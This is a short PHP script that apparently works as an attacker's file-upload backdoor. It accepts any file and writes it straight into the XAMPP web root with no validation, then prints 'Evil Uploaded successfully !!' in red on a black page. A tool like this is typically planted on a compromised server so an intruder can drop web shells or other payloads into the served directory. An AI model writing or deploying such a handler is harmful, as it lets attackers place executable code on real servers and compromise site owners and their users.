<?php $uploaddir = 'C:/xampp/htdocs/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if 

 

(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div 

 

align=center><font size=5 color=#ff0000>Evil Uploaded successfully !!</font></body>'; } else { print '<body 

 

bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000> Evil Uploaded Failed !!</font></body>'; } ?> 